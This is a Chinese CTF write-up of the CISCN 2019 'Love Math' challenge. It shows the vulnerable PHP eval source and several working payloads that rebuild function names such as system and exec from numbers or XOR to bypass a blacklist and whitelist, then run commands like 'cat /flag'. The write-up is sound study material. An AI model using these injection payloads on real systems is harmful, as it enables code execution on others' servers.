CISCN 2019 初赛 Love Math

hdfzzf
2022-04-10 (Updated: 2022-04-10)
CTF
PHP知识

题目地址：Love Math

题目信息

进入环境直接就给了源码： 

<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}

解题

需要先知道几个PHP的特性：

  • 动态函数。$func='print_r';$func('hello');，这句代码是能够输出hello的，那是因为$func被print_r代替，因此能够成功执行。
  • 函数名为字符串。从上面的例子也可以看出函数名是字符串。

先分析一下代码，首先设置了一个黑名单，然后再设置了一个白名单，也就是我们传入的参数c不能有黑名单的字符，又必须包含白名单的字符，而且长度不能超过80。这样子才能够最终执行到eval('echo '.$content.';');。

因此，本题考察的应该是RCE。我们需要将$content通过某种方式变为类似system('ls')命令。

方法1

先放出最开始的payload： 

?c=base_convert(1751504350,10,36)(base_convert(784,10,36))

解释： 

base_convert(1751504350,10,36) -> system
base_convert(784,10,36) -> ls
因此，等价于system('ls')

也成功被执行：

但是，当执行有特殊符号的时候就不行了，比如system('ls /')，因为特殊符号不能直接用36进制表达，如果直接输入则因为不在白名单而无法通过。因此需要利用hex2bin将16进制的转为字符，但是16进制也无法过白名单（纯数字可以过，或者白名单内的函数名可以过），因此还需要将16进制转为10进制才可以。因此就由了如下payload： 

?c=base_convert(1751504350,10,36)(base_convert(37907361743,10,36)(dechex(1819484207)))

解释： 

base_convert(1751504350,10,36) -> system
base_convert(37907361743,10,36) -> hex2bin
dechex(1819484207) -> 6c73202f(ls /的16进制表示)
因此，等价于system(hex2bin(6c73202f)) -> system('ls /')

但是，此时的长度已经超过80了。

小知识

接下来就得想如何将长度缩减，忽然发现可以在url中这样传入数据： 

?p=$cmd=id;system($_GET[cmd])

这样子最终传入的p为system(id)。

因此可以利用这种办法只在c参数传入必要的，剩下的都通过上述方式放到c中。 

?c=system('ls /')
-> ?c=($$pi){min}(($$pi){max})

其中$pi=base_convert(37907361743,10,36)(dechex(1598506324)) -> _GET
这样子($$pi){min}(($$pi){max}) -> $_GET{min}($_GET{max})
其中，{}用于代替[]，即$_GET[min]($_GET[max])

然后再传入min=system和max=ls /即可。最终payload如下： 

?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){max})&pi=system&max=ls /

如果使用min长度就会超，因此其中一个变量使用pi（这里$pi和pi是不一样的，前者是变量，后者就是一个参数名）

将max=cat /flag带入即可得到flag。

也可以直接执行，不过要找到比较短的命令（思路也是类似的）： 

//exec('hex2bin(dechex(109270211257898))') => exec('cat f*')
($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))

//system('cat'.dechex(16)^asinh^pi) => system('cat *')
base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))

方法2

利用一个函数getallheaders，然后把命令通过HTTP头部传入。payload如下： 

?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){cmd})

解释： 

$pi(696468,10,36) -> exec
$pi(8768397090111664438,10,30) -> getallheaders
因此，等价于exec(getallheaders(){2})，就是获取HTTP头部信息中，字段为2的内容。

方法3

前两种方法都是利用将要传入的命令转为数字，然后通过函数再转换回对应的函数名，从而执行命令。但是其实白名单里面有许多的可用字符，用这些字符代替之前的数字，进行某种运算得到想要的函数名。

php
<?php
$payload = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
for($k=1;$k<=sizeof($payload);$k++){
    for($i = 0;$i < 9; $i++){
        for($j = 0;$j <=9;$j++){
            $exp = $payload[$k] ^ $i.$j;
            echo($payload[$k]."^$i$j"."==>$exp");
            echo "<br />";
        }
    }
}
?>

会发现 

is_nan^64==>_G
tan^15==>ET

因此，最终的payload为： 

?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&0=system&1=cat%20/flag

总结

这题考察的都是关于PHP的知识（我这不会PHP的太难了）
